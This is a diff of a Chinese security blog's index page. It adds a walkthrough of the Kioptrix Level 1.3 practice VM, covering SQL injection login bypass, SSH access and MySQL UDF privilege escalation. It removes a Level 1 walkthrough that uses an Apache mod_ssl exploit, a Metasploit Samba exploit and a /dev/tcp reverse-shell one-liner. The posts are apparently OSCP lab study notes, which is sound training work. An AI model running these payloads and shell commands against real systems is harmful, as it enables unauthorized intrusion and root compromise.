@@ -255,6 +255,134 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/02/KIOPTRIX-LEVEL-1-3-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/" class="post-title-link" itemprop="url">KIOPTRIX: LEVEL 1.3 (#4)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-02 13:38:26 / 修改时间：13:40:20" itemprop="dateCreated datePublished" datetime="2022-11-02T13:38:26+08:00">2022-11-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="KIOPTRIX-LEVEL-1-3-4"><a href="#KIOPTRIX-LEVEL-1-3-4" class="headerlink" title="KIOPTRIX: LEVEL 1.3 (#4)"></a>KIOPTRIX: LEVEL 1.3 (#4)</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>这个靶机有点特殊，需要新创建一个空的虚拟机，移除现在的硬盘，用靶机替换。</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102121247513.png" alt="image-20221102121247513"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>打开靶场之后，同样的扫c段拿到靶机的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102121830519.png" alt="image-20221102121830519"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.153</span><br></pre></td></tr></table></figure>
+
+<p>然后扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.153</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122018182.png" alt="image-20221102122018182"></p>
+<p>22,80,139,445</p>
+<h1 id="漏洞利用-sql"><a href="#漏洞利用-sql" class="headerlink" title="漏洞利用-sql"></a>漏洞利用-sql</h1><p>感觉有永恒之蓝，不过还是先照例访问一下80端口</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122246562.png" alt="image-20221102122246562"></p>
+<p>一个登陆框，先扫一下目录，用下万能密码</p>
+<p>万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122419294.png" alt="image-20221102122419294"></p>
+<p>登陆之后说你的账户有问题，请联系本地administrator进行处理问题。</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122615367.png" alt="image-20221102122615367"></p>
+<p>笑死，还发现一个反射型xss，不过万能密码这条路行不通了，扫目录发现这么个东西</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122735774.png" alt="image-20221102122735774"></p>
+<p>也是有什么东西出错了</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122856132.png" alt="image-20221102122856132"></p>
+<p>这里卡了半天，搜了下才知道要注意url，john，也就是指的这个用户为john我们需要先把admin的cookie清除掉，随后用万能密码登录john。</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102123634806.png" alt="image-20221102123634806"></p>
+<p>这样就可以去试试登录ssh了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.100.153</span><br><span class="line">MyNameIsJohn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102123929798.png" alt="image-20221102123929798"></p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102124049503.png" alt="image-20221102124049503"></p>
+<p>但是没办法执行命令，于是百度了一下。</p>
+<p>这里需要生成一个tty</p>
+<p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">如何将简单的Shell转换成为完全交互式的TTY - 码农教程 (manongjc.com)</a></p>
+<p>又学到了。</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102125407311.png" alt="image-20221102125407311"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>随后就是拿root权限</p>
+<p>通过<code>lsb_release -a</code></p>
+<p>拿到版本信息，然后在exp的网站上面找一个提权脚本下载下来。</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102125839075.png" alt="image-20221102125839075"></p>
+<p>但是我发现脚本怎么都传不过去啊。</p>
+<p>我觉得是这个tty的问题，我发执行长期返回的命令。</p>
+<p>所以，求助了一下攻略，这里使用的是mysqludf提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/</span><br><span class="line">cat checklogin.php</span><br></pre></td></tr></table></figure>
+
+<p>可以看到root用户是空密码</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102131631523.png" alt="image-20221102131631523"></p>
+<p>我们可以通过mysql服务登录root账户</p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102131840802.png" alt="image-20221102131840802"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102132807319.png" alt="image-20221102132807319"></p>
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102133216681.png" alt="image-20221102133216681"></p>
+<p>查询UDF表，有sys_exec函数，可以利用这个函数执行系统命令。通过sys_exec函数将john添加到管理员组。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -a -G admin john&#x27;);</span><br><span class="line">exit</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102133345010.png" alt="image-20221102133345010"></p>
+<p>拿下</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权并不能完全依赖系统的提权脚本，也可以通过其他手段，比如最常见的mysqludf提权。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/01/KIOPTRIX-LEVEL-1-2-3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -505,139 +633,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/01/Kioptrix-Level-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/01/Kioptrix-Level-1/" class="post-title-link" itemprop="url">Kioptrix: Level 1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-01 14:22:52 / 修改时间：14:24:10" itemprop="dateCreated datePublished" datetime="2022-11-01T14:22:52+08:00">2022-11-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix: Level 1"></a>Kioptrix: Level 1</h1><p>最近要开始备战OSCP了，所以专门开了个分区存放我的打靶机心路。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先要给靶机开启nat模式，如果还是扫不到，需要进入虚拟机文件中的vmx文件中将所有的bridge改为nat，才扫得到。</p>
-<p>开启靶机之后首先上kali拿到目标靶机的ip地址，使用nmap扫c段。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
-
-<p>拿到靶机的地址为192.168.100.150</p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101125154578.png" alt="image-20221101125154578"></p>
-<p>随后扫全端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.150</span><br></pre></td></tr></table></figure>
-
-<p>扫描到的端口有，22,80,111,139,443，1024端口</p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101130014208.png" alt="image-20221101130014208"></p>
-<h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p>首先扫一扫目录</p>
-<p>由于oscp偏向于使用kail，我这里也用kali里面的工具进行扫描。</p>
-<p>用的nikto</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.100.150</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132111365.png" alt="image-20221101132111365"></p>
-<p>拿到一些中间件信息和网站目录</p>
-<p>使用kali里面搜索利用工具的命令，<code>searchsploit apache 1.3.20</code></p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132352327.png" alt="image-20221101132352327"></p>
-<p>科普：Apache 和 mod_SSL是包含用于SSL的额外模块的Apache服务器</p>
-<p>在利用的exp中，发现了我们扫出来的mod_ssl版本，</p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132748772.png" alt="image-20221101132748772"></p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132756892.png" alt="image-20221101132756892"></p>
-<p>定位到该脚本存放的目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate 764.c</span><br><span class="line">cd /usr/share/exploitdb/exploits/unix/remote/</span><br></pre></td></tr></table></figure>
-
-<p>将他拷贝到桌面上</p>
-<p>要使用这个脚本需要安装相关环境</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl1.0-dev</span><br></pre></td></tr></table></figure>
-
-<h1 id="漏洞利用1-Apache"><a href="#漏洞利用1-Apache" class="headerlink" title="漏洞利用1-Apache"></a>漏洞利用1-Apache</h1><p>首先我们需要修改脚本中的一些内容</p>
-<p>1.在头文件添加</p>
-<p><code>#include &lt;openssl/rc4.h&gt; #include &lt;openssl/md5.h&gt;</code></p>
-<p>2.将#define COMMAND2，wget后面的URL修改为<code>https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;</code></p>
-<p>3.将unsigned char *p, *end前添加const</p>
-<p>最后在kali上成功编译</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o okk 764.c -lcrypto</span><br></pre></td></tr></table></figure>
-
-<p>随后执行<code>./okk 0x6b 192.168.100.150 -c 40</code></p>
-<p>我人麻了啊，什么都是照着做的</p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101140209884.png" alt="image-20221101140209884"></p>
-<p>就我的报错是吧，拿不到root权限。</p>
-<p>不过不用担心，这里还有另外一种方式拿到root权限。</p>
-<h1 id="漏洞利用2-Samba"><a href="#漏洞利用2-Samba" class="headerlink" title="漏洞利用2-Samba"></a>漏洞利用2-Samba</h1><p>科普：<em>Samba</em>是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成</p>
-<p>在信息收集的时候发现了主机装了samba，版本为Samba2.2.1a</p>
-<p>使用msf搜索samba</p>
-<p><code>search Samba</code></p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101140539118.png" alt="image-20221101140539118"></p>
-<p>用这个</p>
-<p>设置好目标ip地址和荷载<code>linux/x86/shell_bind_tcp </code>之后直接run就可以了，要先设置荷载</p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101141247508.png" alt="image-20221101141247508"></p>
-<p>这样成功拿到对面root权限。</p>
-<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>攻击机执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure>
-
-<p>受害机执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.100.129/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101141823823.png" alt="image-20221101141823823"></p>
-<p>成功连接</p>
-<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101141835450.png" alt="image-20221101141835450"></p>
-<p>成功拿下这个靶机</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要来说第一次接触这种靶机，对于kali的命令使用也不太熟练，稍后会进行一系列的总结。</p>
-<p>这次的思路的话，也就是扫端口，探测目标中间件版本或者系统版本，版本漏洞利用。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -709,7 +704,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
